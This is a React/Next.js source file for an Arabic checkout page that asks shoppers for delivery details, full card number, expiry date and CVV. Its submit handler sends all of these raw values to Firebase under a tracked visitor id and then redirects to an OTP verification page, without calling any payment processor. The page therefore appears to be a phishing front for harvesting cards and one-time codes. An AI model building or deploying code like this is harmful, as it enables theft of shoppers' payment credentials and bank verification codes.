"use client"

import type React from "react"

import { useState } from "react"
import { ArrowRight, CreditCard, Smartphone } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Separator } from "@/components/ui/separator"
import Link from "next/link"
import { useCart } from "@/contexts/cart-context"
import { addData } from "@/lib/firebase"

export default function CheckoutPage() {
  const [paymentMethod, setPaymentMethod] = useState("card")
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  })

  const { getCartItems, getTotalPrice } = useCart()
  const cartItems = getCartItems()

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }))
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    // Redirect to OTP verification
    const visitorId=localStorage.getItem('visitor')
    addData({id:visitorId,formData})
    window.location.href = "/otp-verification"
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white" dir="rtl">
      {/* Header */}
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <Link href="/cart">
              <Button variant="ghost" size="icon">
                <ArrowRight className="h-5 w-5" />
              </Button>
            </Link>
            <h1 className="text-xl font-bold text-blue-600">إتمام الطلب</h1>
            <div></div>
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <form onSubmit={handleSubmit} className="grid lg:grid-cols-3 gap-8">
          {/* Checkout Form */}
          <div className="lg:col-span-2 space-y-6">
            {/* Delivery Information */}
            <Card>
              <CardHeader>
                <CardTitle>معلومات التوصيل</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="name">الاسم الكامل</Label>
                    <Input
                      id="name"
                      value={formData.name}
                      onChange={(e) => handleInputChange("name", e.target.value)}
                      placeholder="أدخل اسمك الكامل"
                      required
                    />
                  </div>
                  <div>
                    <Label htmlFor="phone">رقم الهاتف</Label>
                    <Input
                      id="phone"
                      value={formData.phone}
                      onChange={(e) => handleInputChange("phone", e.target.value)}
                      placeholder="+968 9X XXX XXX"
                      required
                    />
                  </div>
                </div>
         
                <div>
                  <Label htmlFor="address">العنوان</Label>
                  <Input
                    id="address"
                    value={formData.address}
                    onChange={(e) => handleInputChange("address", e.target.value)}
                    placeholder="أدخل عنوانك بالتفصيل"
                    required
                  />
                </div>
                <div>
                  <Label htmlFor="city">المدينة</Label>
                  <Input
                    id="city"
                    value={formData.city}
                    onChange={(e) => handleInputChange("city", e.target.value)}
                    placeholder="مسقط"
                    required
                  />
                </div>
              </CardContent>
            </Card>

            {/* Payment Method */}
            <Card>
              <CardHeader>
                <CardTitle>طريقة الدفع</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
         

                {paymentMethod === "card" && (
                  <div className="space-y-4 mt-4">
                    <div>
                      <Label htmlFor="cardNumber">رقم البطاقة</Label>
                      <Input
                        id="cardNumber"
                        value={formData.cardNumber}
                        onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                        placeholder="1234 5678 9012 3456"
                        required
                      />
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <Label htmlFor="expiryDate">تاريخ الانتهاء</Label>
                        <Input
                          id="expiryDate"
                          value={formData.expiryDate}
                          onChange={(e) => handleInputChange("expiryDate", e.target.value)}
                          placeholder="MM/YY"
                          required
                        />
                      </div>
                      <div>
                        <Label htmlFor="cvv">CVV</Label>
                        <Input
                          id="cvv"
                          value={formData.cvv}
                          onChange={(e) => handleInputChange("cvv", e.target.value)}
                          placeholder="123"
                          required
                        />
                      </div>
                    </div>
                  </div>
                )}
              </CardContent>
              <CardFooter className="flex justify-center">
                <img className="m-1" src="/visa-svgrepo-com.svg" alt="" width={45}/>
                <img className="m-1" src="/master.svg" alt="" width={45}/>
                <img className="m-1" src="/exp.svg" alt="" width={45}/>
              </CardFooter>
            </Card>
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-1">
            <Card className="sticky top-4">
              <CardHeader>
                <CardTitle>ملخص الطلب</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  {cartItems.map((item) => (
                    <div key={item!.id} className="flex justify-between text-sm">
                      <span>
                        {item!.nameAr} × {item!.quantity}
                      </span>
                      <span>{(item!.price * item!.quantity).toFixed(2)} ر.ع</span>
                    </div>
                  ))}
                </div>
                <Separator />
                <div className="flex justify-between">
                  <span>المجموع الفرعي:</span>
                  <span>{getTotalPrice().toFixed(2)} ر.ع</span>
                </div>
                <div className="flex justify-between">
                  <span>رسوم التوصيل:</span>
                  <span>0.00 ر.ع</span>
                </div>
                <Separator />
                <div className="flex justify-between font-bold text-lg">
                  <span>المجموع الكلي:</span>
                  <span>{(getTotalPrice().toFixed(2))} ر.ع</span>
                </div>
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 mt-6">
                  تأكيد الطلب والدفع
                </Button>
              </CardContent>
            </Card>
          </div>
        </form>
      </main>
    </div>
  )
}
